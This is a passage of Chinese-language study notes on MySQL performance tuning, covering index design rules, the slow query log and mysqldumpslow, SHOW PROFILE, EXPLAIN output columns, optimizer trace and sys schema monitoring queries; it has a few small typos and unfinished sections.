<h2 id="索引的设计原则"><a href="#索引的设计原则" class="headerlink" title="索引的设计原则"></a>索引的设计原则</h2><p><strong>单表的索引不应该超过6个</strong></p>
<blockquote>
<ol>
<li>太多索引会占用过多空间</li>
<li>索引会影响插入、更新、删除的性能</li>
<li>索引多会导致优化器选择最适合的索引过慢。</li>
</ol>
</blockquote>
<h3 id="适合创建索引的情况"><a href="#适合创建索引的情况" class="headerlink" title="适合创建索引的情况"></a>适合创建索引的情况</h3><p>一、字段的数值<strong>拥有唯一性</strong>的限制</p>
<p>索引本身具有约束作用，如果数据表中<strong>某一个字段是唯一的</strong>，那么就可以直接创建<strong>唯一索引</strong>或<strong>主键索引</strong></p>
<blockquote>
<p>业务上具有唯一性的字段，即使是组合字段，也必须创建唯一索引。</p>
<p>创建唯一索引带来的插入删除效率的降低远不及其对查询效率的提高</p>
</blockquote>
<p>二、频繁作为<code>WHERE</code>查询条件的字段</p>
<p>三、经常<code>GROUP BY</code>（分组）和<code>ORDER BY</code>（排序）的字段</p>
<blockquote>
<p>针对GROUP BY 和ORDER BY常常一起使用的场景，建议创建联合索引，并且GROUP BY的字段放在ORDER BY前</p>
</blockquote>
<p>四、<code>UPDATE</code>、<code>DELETE</code>的<code>WHERE</code>条件列</p>
<blockquote>
<p>若更新字段不是索引字段，效率提升明显。</p>
</blockquote>
<p>五、<code>DISTINCT</code>字段需要创建索引</p>
<p>六、多表<code>JOIN</code>连接操作时，创建索引的事项</p>
<blockquote>
<ol>
<li>连接表的数量尽量不要超过3张</li>
<li>对 WHERE 条件创建索引</li>
<li>对用于连接（ON）的字段创建索引，并且该字段在多张表中<strong>类型必须一致</strong></li>
</ol>
</blockquote>
<p>七、使用<strong>列的类型小</strong>的字段创建索引</p>
<blockquote>
<p>类型从大到小：</p>
<p>整型：TINYINT、MEDIUMINT、INT、BIGINT</p>
</blockquote>
<p>八、使用<strong>字符串的前缀</strong>而不是整个字符串创建索引</p>
<p>字符串截取长度建议采用以下语句，寻找最接近于1且长度最短时的情况，一般为20：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span> <span class="keyword">LEFT</span>(列名,索引长度为<span class="number">10</span>))<span class="operator">/</span><span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> sub10，<span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span> <span class="keyword">LEFT</span>(列名,索引长度为<span class="number">15</span>))<span class="operator">/</span><span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> sub15，<span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span> <span class="keyword">LEFT</span>(列名,索引长度为<span class="number">20</span>))<span class="operator">/</span><span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> sub20</span><br><span class="line"><span class="keyword">FROM</span> tableName</span><br></pre></td></tr></table></figure>

<p>九、<strong>区分度高（散列性高）</strong>的列适合用于创建索引</p>
<p>采用如下语句计算区分度，越接近<code>1</code>越好，一般<code>33%</code>已经为较高效索引</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="keyword">distinct</span> colName)<span class="operator">/</span><span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> tableName <span class="operator">-</span><span class="operator">&gt;</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>十、使用<strong>最频繁</strong>的列放在<strong>联合索引</strong>的<strong>左</strong>侧</p>
<p>十一、在<strong>多个字段都需要</strong>创建索引的情况下，<strong>联合索引优于单值索引</strong></p>
<h3 id="不适合作为索引的情况"><a href="#不适合作为索引的情况" class="headerlink" title="不适合作为索引的情况"></a>不适合作为索引的情况</h3><p>一、在<code>where</code>中不会使用到的字段，不需要创建索引</p>
<p>二、数据量较小的表，不应当创建索引</p>
<p>三、存在<strong>大量重复数据</strong>的列不应当创建索引</p>
<blockquote>
<p>数据重复度高于10%时，就不应该在此字段上建立索引</p>
</blockquote>
<p>四、避免对<strong>经常更新的表</strong>创建过多的索引</p>
<p>五、不建议用<strong>无序的值</strong>作为索引</p>
<blockquote>
<p>如身份证、UID等</p>
</blockquote>
<p>六、及时删除不再使用或很少使用的索引</p>
<p>七、不要定义冗余或重复的索引</p>
<h2 id="性能分析工具的使用"><a href="#性能分析工具的使用" class="headerlink" title="性能分析工具的使用"></a>性能分析工具的使用</h2><h3 id="数据库服务器优化的一般步骤"><a href="#数据库服务器优化的一般步骤" class="headerlink" title="数据库服务器优化的一般步骤"></a>数据库服务器优化的一般步骤</h3><p><img src="D:\workinenglish\typora_image\image-20241105223115832.png" alt="image-20241105223115832"></p>
<p><img src="D:\workinenglish\typora_image\image-20241105223136340.png" alt="image-20241105223136340"></p>
<p>SQL及索引 –&gt; 数据库表结构 –&gt; 系统配置 –&gt; 硬件 </p>
<h3 id="查看系统参数"><a href="#查看系统参数" class="headerlink" title="查看系统参数"></a>查看系统参数</h3><h4 id="各类系统性能参数"><a href="#各类系统性能参数" class="headerlink" title="各类系统性能参数"></a>各类系统性能参数</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> [<span class="keyword">GLOBAL</span> <span class="operator">|</span> SESSION] STATUS <span class="keyword">LIKE</span> <span class="string">&#x27;参数&#x27;</span></span><br></pre></td></tr></table></figure>

<p>常见的参数包括：</p>
<blockquote>
<p>Connections: 连接MySQL服务器次数</p>
<p>Uptime: MySQL服务器上线时间</p>
<p>Slow_queries: 慢查询次数</p>
<p>Innodb_rows_read: Select查询返回的次数</p>
<p>Innodb_rows_inserted: 执行Insert插入操作的次数</p>
<p>Innodb_rows_updated: 执行update更新操作的次数</p>
<p>Innodb_rows_deleted: 执行delete删除操作的次数</p>
<p>Com_select: 查询操作次数</p>
<p>Com_insert: 插入操作次数，对于批量插入的操作，记录一次</p>
<p>Com_update: 更新操作次数</p>
<p>Com_delete: 删除操作次数</p>
</blockquote>
<h4 id="统计SQL的查询成本：last-query-cost"><a href="#统计SQL的查询成本：last-query-cost" class="headerlink" title="统计SQL的查询成本：last_query_cost"></a>统计SQL的查询成本：last_query_cost</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> STATUS <span class="keyword">LIKE</span> <span class="string">&#x27;last_query_cost&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="定位执行慢的-SQL：慢查询日志"><a href="#定位执行慢的-SQL：慢查询日志" class="headerlink" title="定位执行慢的 SQL：慢查询日志"></a>定位执行慢的 SQL：慢查询日志</h3><p>慢查询日志可以记录MySQL中<strong>响应时间超过阈值</strong>的语句，阈值可以自己定义，参数为<code>long_query_time</code>，单位是<code>秒</code>。</p>
<p>默认情况下，慢查询日志是关闭的，应当只在需要调优时打开。</p>
<p>日志应当及时删除。</p>
<h4 id="查看慢查询日志开关情况"><a href="#查看慢查询日志开关情况" class="headerlink" title="查看慢查询日志开关情况"></a>查看慢查询日志开关情况</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;slow_query_log&#x27;</span>;</span><br></pre></td></tr></table></figure>



<h4 id="打开-关闭慢查询日志"><a href="#打开-关闭慢查询日志" class="headerlink" title="打开&#x2F;关闭慢查询日志"></a>打开&#x2F;关闭慢查询日志</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> slow_query_log <span class="operator">=</span> <span class="keyword">on</span>; <span class="comment">-- or off</span></span><br></pre></td></tr></table></figure>



<h4 id="修改慢查询阈值long-query-time"><a href="#修改慢查询阈值long-query-time" class="headerlink" title="修改慢查询阈值long_query_time"></a>修改慢查询阈值long_query_time</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> long_query_time <span class="operator">=</span> <span class="number">1</span>; <span class="comment">-- 临时修改，重启失效</span></span><br></pre></td></tr></table></figure>



<h4 id="永久修改上述参数"><a href="#永久修改上述参数" class="headerlink" title="永久修改上述参数"></a>永久修改上述参数</h4><p>修改<code>my.cnf</code>文件，在<code>[mysqld]</code>下增加或修改参数如下：</p>
<blockquote>
<p>slow_query_log &#x3D; ON  #OFF</p>
<p>slow_query_log_file &#x3D; &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;slow.log  # 日志文件的目录和文件名</p>
<p>long_query_time &#x3D; 3</p>
<p>log_output &#x3D; FILE</p>
</blockquote>
<p>重启服务器生效。</p>
<h4 id="慢查询日志分析工具：mysqldumpslow"><a href="#慢查询日志分析工具：mysqldumpslow" class="headerlink" title="慢查询日志分析工具：mysqldumpslow"></a>慢查询日志分析工具：mysqldumpslow</h4><p>此工具不在数据库中运行，而是在shell中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqldumpslow --help  # 查看帮助</span><br></pre></td></tr></table></figure>

<p>包含以下参数：</p>
<blockquote>
<p>-a: 不将数字抽象成N，字符串抽象成S<br>-s: 是表示按照何种方式排序：<br>    c: 访问次数<br>    l: 锁定时间<br>    r: 返回记录<br>    t: 查询时间<br>    al:平均锁定时间<br>    ar:平均返回记录数<br>    at:平均查询时间 （默认方式）<br>    ac:平均查询次数<br>-t: 即为返回前面多少条的数据；</p>
<p>-g: 后边搭配一个正则匹配模式，大小写不敏感的</p>
</blockquote>
<p>常用操作如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">得到返回记录集最多的10个SQL</span></span><br><span class="line">mysqldumpslow -s r -t 10 /var/lib/mysql/slow.log</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">得到访问次数最多的10个SQL</span></span><br><span class="line">mysqldumpslow -s c -t 10 /var/lib/mysql/slow.log</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">得到按照时间排序的前10条里面含有左连接的查询语句</span></span><br><span class="line">mysqldumpslow -s t -t 10 -g &quot;left join&quot; /var/lib/mysql/atguigu-slow.log</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">另外建议在使用这些命令时结合 | 和more 使用 ，否则有可能出现爆屏情况</span></span><br><span class="line">mysqldumpslow -s r -t 10 /var/lib/mysql/slow.log | more</span><br></pre></td></tr></table></figure>

<p>使用如下命令在删除日志后重新生成日志文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqladmin -uroot -p flush-logs slow</span><br></pre></td></tr></table></figure>



<h3 id="查看-SQL-执行成本：SHOW-PROFILE"><a href="#查看-SQL-执行成本：SHOW-PROFILE" class="headerlink" title="查看 SQL 执行成本：SHOW PROFILE"></a>查看 SQL 执行成本：SHOW PROFILE</h3><p>此命令即将弃用，以后可以通过information_schema中的profiling表查看</p>
<p>相关命令如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查看是否开启执行成本监控</span></span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;profiling&#x27;</span>;</span><br><span class="line"><span class="comment">-- 打开/关闭show profile</span></span><br><span class="line"><span class="keyword">set</span> profiling <span class="operator">=</span> &quot;ON&quot; <span class="comment">-- or OFF</span></span><br><span class="line"><span class="comment">-- 查看最近一次查询开销</span></span><br><span class="line"><span class="keyword">show</span> profile</span><br><span class="line"><span class="comment">-- 查看当前会话都有哪些profile</span></span><br><span class="line"><span class="keyword">show</span> profiles</span><br><span class="line"><span class="comment">-- 查看某一命令的某一开销</span></span><br><span class="line"><span class="keyword">show</span> profile cpu <span class="keyword">for</span> query <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p><strong>Show profile的常用查询参数：</strong></p>
<blockquote>
<p>① ALL：显示所有的开销信息。 </p>
<p>② BLOCK IO：显示块IO开销。</p>
<p>③ CONTEXT SWITCHES：上下文切换开<br>销。</p>
<p>④ CPU：显示CPU开销信息。</p>
<p>⑤ IPC：显示发送和接收开销信息。</p>
<p>⑥ MEMORY：显示内存开销信<br>息。 </p>
<p>⑦ PAGE FAULTS：显示页面错误开销信息。</p>
<p>⑧ SOURCE：显示和Source_function，Source_file，<br>Source_line相关的开销信息。 </p>
<p>⑨ SWAPS：显示交换次数开销信息。</p>
</blockquote>
<p><strong>开发过程中需要留意以下结论</strong>,出现说明SQL语句需要优化</p>
<blockquote>
<p><strong>converting HEAP to MyISAM</strong> 查询结果太大，内存不足，数据需要向磁盘搬了</p>
<p>creating tmp table: 创建临时表，先拷贝数据到临时表，用完再删除</p>
<p>copying to tmp table on disk: 把内存中的临时表复制到磁盘上</p>
<p>locked:</p>
</blockquote>
<h3 id="分析查询语句：EXPLAIN"><a href="#分析查询语句：EXPLAIN" class="headerlink" title="分析查询语句：EXPLAIN"></a>分析查询语句：EXPLAIN</h3><p><strong>参考文献</strong></p>
<p><a href="https://dev.mysql.com/doc/refman/5.7/en/explain-output.html">MySQL5.7</a><br><a href="https://dev.mysql.com/doc/refman/8.0/en/explain-output.htm">MySQL8.0</a></p>
<p><strong>版本区别</strong></p>
<p>MySQL 5.6.3以前只能<code>EXPLAIN SELECT</code> ；MYSQL 5.6.3以后就可以 <code>EXPLAIN SELECT</code>，<code>UPDATE</code>，<code>DELETE</code><br>在<code>5.7</code>以前的版本中，想要显示 <code>partitions</code> 需要使用 <code>explain partitions</code> 命令；想要显示<code>filtered</code> 需要使用 <code>explain extended</code> 命令。在5.7版本后，默认explain直接显示partitions和filtered中的信息</p>
<h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">EXPLAIN <span class="keyword">SELECT</span> select_options</span><br><span class="line"><span class="comment">-- or</span></span><br><span class="line"><span class="keyword">DESCRIBE</span> <span class="keyword">SELECT</span> select_opyions</span><br></pre></td></tr></table></figure>



<p><code>EXPLAIN</code>语句的输出结果中各列的作用如下:</p>
<table>
<thead>
<tr>
<th>列名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>在一个大的查询语句中每个SELECT关键字都对应一个 唯一的id</td>
</tr>
<tr>
<td>select_type</td>
<td>SELECT关键字对应的那个查询的类型</td>
</tr>
<tr>
<td>table</td>
<td>表名</td>
</tr>
<tr>
<td>partitions</td>
<td>匹配的分区信息</td>
</tr>
<tr>
<td>type</td>
<td>针对单表的访问方法</td>
</tr>
<tr>
<td>possible_keys</td>
<td>可能用到的索引</td>
</tr>
<tr>
<td>key</td>
<td>实际上使用的索引</td>
</tr>
<tr>
<td>key_len</td>
<td>实际使用到的索引长度</td>
</tr>
<tr>
<td>ref</td>
<td>当使用索引列等值查询时，与索引列进行等值匹配的对象信息</td>
</tr>
<tr>
<td>rows</td>
<td>预估的需要读取的记录条数</td>
</tr>
<tr>
<td>filtered</td>
<td>某个表经过搜索条件过滤后剩余记录条数的百分比</td>
</tr>
<tr>
<td>Extra</td>
<td>一些额外的信息</td>
</tr>
</tbody></table>
<h4 id="EXPLAIN各列的具体作用"><a href="#EXPLAIN各列的具体作用" class="headerlink" title="EXPLAIN各列的具体作用"></a>EXPLAIN各列的具体作用</h4><p>explain不考虑各种cache，不能显示MySQL在执行查询时所作的优化工作，不会说明触发器、存储过程的信息或用户自定义函数对查询的影响，且部分统计信息是估计值。</p>
<h5 id="table"><a href="#table" class="headerlink" title="table"></a>table</h5><blockquote>
<p>不论我们的查询语句有多复杂，里边儿 包含了多少个表 ，到最后也是需要对每个表进行 单表访问 的，所以MySQL规定EXPLAIN语句输出的每条记录都对应着某个单表的访问方法，该条记录的table列代表着该表的表名（有时不是真实的表名字，可能是简称）</p>
</blockquote>
<h5 id="id"><a href="#id" class="headerlink" title="id"></a><strong>id</strong></h5><p>当查询语句包含联合查询时，我们把前面的表称为驱动表，后面的表称为被驱动表。</p>
<p>（查询优化器可能对查询进行优化，可能导致驱动表和被驱动表颠倒）</p>
<blockquote>
<p>我们写的查询语句一般都以 SELECT 关键字开头，每一个SELECT对应一个id。（内涵子查询的语句，可能经过子查询优化器优化后转为联合查询，因此也可能不是一个SELECT对应一个id)</p>
</blockquote>
<ol>
<li>id如果相同，可以认为是一组，从上往下顺序执行</li>
<li>在所有组中，id值越大，优先级越高，越先执行</li>
<li><strong>关注点</strong>：id号每个号码，表示一趟独立的查询, 一个sql的查询趟数越少越好</li>
</ol>
<h5 id="select-type"><a href="#select-type" class="headerlink" title="select_type"></a><strong>select_type</strong></h5><p>常见字段如下：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>SIMPLE</td>
<td>查询语句不包含UNION或子查询的</td>
</tr>
<tr>
<td>PRIMARY</td>
<td>包含 UNION、UNION ALL、子查询的查询语句，最左边的select对应的select_type</td>
</tr>
<tr>
<td>UNION</td>
<td>包含 UNION、UNION ALL、子查询的查询语句，除了最左边的select对应的select_type</td>
</tr>
<tr>
<td>UNION RESULT</td>
<td>包含 UNION、UNION ALL、子查询的查询语句，若生成了临时表，针对临时表的查询即为此类，如：<br /><code>select * from s1 union all select * from s2</code>中需要对UNION后的临时表进行去重</td>
</tr>
<tr>
<td>SUBQUERY</td>
<td>若包含子查询的查询语句不能转为对应的<code>semi-join</code>形式，且此子查询是<strong>不相关</strong>子查询，则该子查询的第一个<code>select</code>关键字对应的查询即为此类，如：</td>
</tr>
<tr>
<td>DEPENDENT SUBQUERY</td>
<td>若包含子查询的查询语句不能转为对应的<code>semi-join</code>形式，且此子查询是<strong>相关</strong>子查询，则该子查询的第一个<code>select</code>关键字对应的查询即为此类，如：</td>
</tr>
<tr>
<td>DEPENDENT UNION</td>
<td>包含 UNION、UNION ALL的大查询语句，如果各个小查询都依赖于外层查询的花，除了最左的小查询，其余小查询均属于此。</td>
</tr>
<tr>
<td>DERIVED</td>
<td>包含派生表的查询，派生表对应的子查询属于此类，如：<br /><code>SELECT * from (select key1,count(*) as c from s1 group by key1)as derived_s1 where c &gt; 1</code></td>
</tr>
<tr>
<td>MATERIALIZED</td>
<td>当查询优化器再执行包含子查询的语句时，选择将子查询物化后于外层查询进行连接查询时，该子查询属于此类</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<h5 id="type-重要"><a href="#type-重要" class="headerlink" title="type(重要)"></a><strong>type</strong>(重要)</h5><p>执行计划的一条记录就代表着MySQL对某个表的<code>执行查询时的访问方法</code>，又称“访问类型”，即<code>type</code>字段。<code>type</code> 字段表示 MySQL 优化器选择的访问类型，它揭示了 MySQL 如何查找所需的数据行。完整的访问方法包括：(按查询效率排序，越往后的方法效率越差)</p>
<ol>
<li><p><code>system</code>：当表中<code>只有一条记录</code>且该表的存储引擎的统计数据是精确的(这种引擎下使用count(*)可以直接得到数据而无需遍历表），如MyISAM，Memory；则其对应的访问方法即为此。</p>
</li>
<li><p><code>const</code>：当我们根据<code>主键</code>或<code>唯一二级索引</code>与常数进行等值匹配时，对单表的访问对应此方法</p>
<blockquote>
<p>select * from s1 where id &#x3D; 1;</p>
</blockquote>
</li>
<li><p><code>eq_ref</code>：连接查询中，被驱动表是通过主键或唯一二级索引等值匹配的方式访问的。</p>
<blockquote>
<p>select * from s1 inner join s2 on s1.id &#x3D; s2.id</p>
<p>此时s1表通过all访问，每得到一个相当于常数的id后与s2匹配</p>
</blockquote>
</li>
<li><p><code>ref</code>：当通过普通的二级索引列与常量进行等值匹配来查询某个表时。</p>
<p> <strong>阿里巴巴开发手册要求尽量得到以上级别</strong></p>
</li>
<li><p><code>full_text</code>：全文索引</p>
</li>
<li><p><code>ref_or_null</code>：当通过普通的二级索引列,且该列值可能为<code>null</code>时，与常量进行等值匹配来查询某个表时。</p>
</li>
<li><p><code>index_merge</code>：Index Merge是MySQL查询优化器在处理SELECT查询时，通过同时使用多个索引来提高查询性能的一种技术。其核心思想是将多个索引的扫描结果进行合并，生成最终的结果集。包括<code>intersection</code>交集合并、<code>union</code>并集合并、<code>sort_union</code>有序并集合并。</p>
</li>
<li><p><code>unique_subquery</code>：</p>
<ol>
<li><strong>子查询优化</strong>：这个访问类型通常出现在涉及子查询的场景中，尤其是当子查询返回唯一行时。MySQL 优化器可能会识别到这种情况，并将子查询转换为一种更高效的查找方法。</li>
<li><strong>唯一索引</strong>：<code>unique_subquery</code> 意味着 MySQL 使用了唯一索引来查找子查询中的唯一行。这种类型通常发生在子查询中的 <code>WHERE</code> 子句使用了唯一索引列来过滤数据。</li>
<li><strong>性能优化</strong>：由于使用了唯一索引，<code>unique_subquery</code> 通常比全表扫描或其他非索引访问方法更快。这是因为唯一索引能够快速定位所需的数据行，而无需扫描整个表或大量数据。</li>
</ol>
</li>
<li><p><code>index_subquery</code>：</p>
</li>
<li><p><code>range</code>:</p>
<p><strong>阿里巴巴开发手册要求最低不能低于此线</strong></p>
</li>
<li><p><code>index</code>: <code>index</code>表示MySQL通过全索引扫描的方式查找数据。这意味着MySQL会遍历整个索引树来查找匹配的行，但它不会回表去查找对应的数据行（除非索引是覆盖索引）。然而，在某些情况下，即使索引扫描后还需要回表获取数据，<code>type</code>仍然可能显示为<code>index</code>，特别是当查询的列完全包含在索引中时。<code>index</code>访问类型通常出现在使用索引列进行查找但查询的列不完全包含在索引中的情况下</p>
</li>
<li><p><code>all</code>：表示MySQL通过全表扫描的方式查找数据。这意味着MySQL会遍历整个数据表来查找匹配的行，而不使用任何索引。</p>
</li>
</ol>
<h5 id="possible-keys、key、key-len"><a href="#possible-keys、key、key-len" class="headerlink" title="possible_keys、key、key_len"></a>possible_keys、key、key_len</h5><p>possible_keys表示某个查询语句中，对某个表执行单表查询时可能使用的索引有哪些，一般查询涉及的字段若存在索引，都会列出。</p>
<p>key表示实际用到的索引有哪些。</p>
<p>key_len表示联合索引实际使用的索引长度（字节数），可以检测是否充分利用索引，对于使用同一个索引的查询，key_len越长越好。</p>
<p>key_len的计算公式：<code>字符集单位长度（unicode=3,gdk=2,ascii=1) * 字符数 + 1（如果可以为NULL) + 2(如果为变长类型)</code></p>
<h5 id="ref、rows、filtered"><a href="#ref、rows、filtered" class="headerlink" title="ref、rows、filtered"></a>ref、rows、filtered</h5><p>ref 当使用索引列等值查询时，与索引列进行等值匹配的对象信息，可能是常数、某一列、函数等</p>
<p>rows 预估想要读取的记录条数，越小越好。</p>
<p>filtered 某个表经过搜索条件过滤后剩余记录条数与rows的百分比，越高越好。对于单表查询，此字段影响不大；对于连接查询，它决定了被驱动表需要执行的次数：<code>rows * filtered</code></p>
<h5 id="Extra（重要）"><a href="#Extra（重要）" class="headerlink" title="Extra（重要）"></a>Extra（重要）</h5><p>说明额外信息，包括一些不适合在其他列显示但又十分重要的信息，可以通过此更准确地理解MySQL如何执行给定的查询语句。，以下是比较重要的一些信息：</p>
<ol>
<li><p><code>No tables used</code>：当查询语句中没有<code>from</code>子句时，提示</p>
</li>
<li><p><code>Impossible WHERE</code>：查询语句的<code>WHERE</code>子句永远为<code>FALSE</code>时显示</p>
</li>
<li><p><code>Using WHERE</code>：当我们使用全表扫描（不使用索引）来执行某个查询，且该语句的<code>where</code>子句中有针对该表的搜索条件时  或   当我们使用索引来执行某个查询，且该语句的<code>where</code>子句中有除了该索引包含的列之外的搜索条件时</p>
</li>
<li><p><code>No matching min/max row</code>:当查询列表中含有<code>MIN</code>或<code>MAX</code>聚合函数，但没有符合<code>where</code>子句的搜索条件的记录时</p>
</li>
<li><p><code>Using Index</code>：当我们的查询列表以及搜索条件中只包含属于某个索引的列，也就是在可以使用覆盖索引的情况下，此时不需要进行回表操作了。</p>
</li>
<li><p><code>Using index condition</code>：有些搜索条件中虽然出现了索引列却不能只使用索引时</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> s1 <span class="keyword">where</span> key1 <span class="operator">&gt;</span> <span class="string">&#x27;z&#x27;</span> <span class="keyword">and</span> key1 <span class="keyword">like</span> <span class="string">&#x27;%a&#x27;</span>; <span class="comment">-- 表中有基于key1建立的索引</span></span><br><span class="line"><span class="comment">-- 上述查询，需要先查询key1对应的索引，找到满足 &gt; &#x27;z&#x27;的对应的主键值，再回表找到对应数据，找到满足like &#x27;%a&#x27;的</span></span><br><span class="line"><span class="comment">-- 优化涉及索引条件下推</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>Using join buffer</code>:当连接查询执行过程中，被驱动表不能有效利用索引加快访问速度，MySQL一般会为其分配一个名为<code>join buffer</code>的内存块以加快查询</p>
</li>
<li><p><code>NOt exists</code>：当使用左外连接，<code>where</code>子句包含要求被驱动表的某一列等于<code>null</code>的搜索条件，而此列又不允许为<code>null</code>时</p>
</li>
<li><p><code>using intersect(...)</code>、<code>using union(..)</code>、<code>using sort_union(..)</code>，分别表示准备使用<code>intersect</code>、<code>union</code>、<code>sort-union</code>索引合并的方式执行查询，（）中为合并的索引名称</p>
</li>
<li><p><code>zero limit</code>：<code>limit</code>子句的参数为0时</p>
</li>
<li><p><code>NULL</code>：有些情况下对结果集中记录进行排序可以使用到索引</p>
</li>
<li><p><code>using filesort</code>：排序无法使用索引，只能在内存（记录少时）或磁盘（记录多时）中进行排序时，<strong>应当尽量建立索引来规避</strong></p>
</li>
<li><p><code>using temporary</code>：当我们需要用临时表实现时，如执行许多包含<code>distinct</code>、<code>group by</code>, <code>union</code>等子句的查询过程中，如果不能有效地利用索引完成，MySQL可能就需要通过建立内部临时表来执行查询。<strong>应当尽量建立索引来规避</strong></p>
</li>
</ol>
<h3 id="EXPLAIN的进一步使用"><a href="#EXPLAIN的进一步使用" class="headerlink" title="EXPLAIN的进一步使用"></a>EXPLAIN的进一步使用</h3><h4 id="1-explain的四种输出格式"><a href="#1-explain的四种输出格式" class="headerlink" title="1. explain的四种输出格式"></a>1. explain的四种输出格式</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">EXPLAIN FORMAT <span class="operator">=</span> JSON<span class="operator">/</span>TREE<span class="operator">/</span> <span class="keyword">SELECT</span> ...</span><br></pre></td></tr></table></figure>

<ol>
<li>传统格式：</li>
<li>JSON格式：相对于传统格式，多了成本属性，输出信息最为详尽</li>
<li>TREE格式：</li>
<li>可视化输出：</li>
</ol>
<h4 id="show-warnings的使用"><a href="#show-warnings的使用" class="headerlink" title="show warnings的使用"></a>show warnings的使用</h4><p>使用explain后可以紧接着使用：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> warnnings\G</span><br></pre></td></tr></table></figure>

<p>三个字段，Level、Code、Message。</p>
<p>Message会显示优化重写的结果</p>
<h3 id="分析优化器的执行计划-trace"><a href="#分析优化器的执行计划-trace" class="headerlink" title="分析优化器的执行计划 trace"></a>分析优化器的执行计划 trace</h3><p>MySQL5.6引入，默认关闭，开启如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set optimizer_trace = &#x27;enabled = on&#x27;,end_markers_in_json = on; -- 以json格式输出</span><br><span class="line">set optimizer_trace_max_size = 100000;		-- 设置可以使用的内存大小，避免json太大无法显示</span><br><span class="line">select * from information_schema.optimizer_trace\G   -- 查看结果</span><br></pre></td></tr></table></figure>



<h3 id="MySQL监控分析视图-sys-schema"><a href="#MySQL监控分析视图-sys-schema" class="headerlink" title="MySQL监控分析视图-sys schema"></a>MySQL监控分析视图-sys schema</h3><ol>
<li>主机相关：以host_summary开头，主要汇总了IO延迟的信息。</li>
<li>Innodb相关：以innodb开头，汇总了innodb buffer信息和事务等待innodb锁的信息。</li>
<li>I&#x2F;o相关：以io开头，汇总了等待I&#x2F;O、I&#x2F;O使用量情况。</li>
<li>内存使用情况：以memory开头，从主机、线程、事件等角度展示内存的使用情况</li>
<li>连接与会话信息：processlist和session相关视图，总结了会话相关信息。</li>
<li>表相关：以schema_table开头的视图，展示了表的统计信息。</li>
<li>索引信息：统计了索引的使用情况，包含冗余索引和未使用的索引情况。</li>
<li>语句相关：以statement开头，包含执行全表扫描、使用临时表、排序等的语句信息。</li>
<li>用户相关：以user开头的视图，统计了用户使用的文件I&#x2F;O、执行语句统计信息。</li>
<li>等待事件相关信息：以wait开头，展示等待事件的延迟情况</li>
</ol>
<p>常见命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 查看冗余索引</span><br><span class="line">select * from sys.schema_redundant_indexes;</span><br><span class="line">-- 查询未使用过的索引</span><br><span class="line">select * from sys.schema_unused_indexes;</span><br><span class="line">-- 查询索引使用情况</span><br><span class="line">select index_name,rows_selected,rows_inserted,rows_updated,rows_deleted from sys.schema_index_statistics where table_schema = &#x27;dbname&#x27;;</span><br><span class="line"></span><br><span class="line"># 1. 查询表的访问量  -&gt; 高访问量的可以放到内存中</span><br><span class="line">select table_schema,table_name,sum(io_read_requests+io_write_requests) as io from</span><br><span class="line">sys.schema_table_statistics group by table_schema,table_name order by io desc;</span><br><span class="line"># 2. 查询占用bufferpool较多的表</span><br><span class="line">select object_schema,object_name,allocated,data</span><br><span class="line">from sys.innodb_buffer_stats_by_table order by allocated limit 10;</span><br><span class="line"># 3. 查看表的全表扫描情况</span><br><span class="line">select * from sys.statements_with_full_table_scans where db=&#x27;dbname&#x27;</span><br><span class="line"></span><br><span class="line">#1. 监控SQL执行的频率</span><br><span class="line">select db,exec_count,query from sys.statement_analysis</span><br><span class="line">order by exec_count desc;</span><br><span class="line">#2. 监控使用了排序的SQL</span><br><span class="line">select db,exec_count,first_seen,last_seen,query</span><br><span class="line">from sys.statements_with_sorting limit 1;</span><br><span class="line">#3. 监控使用了临时表或者磁盘临时表的SQL</span><br><span class="line">select 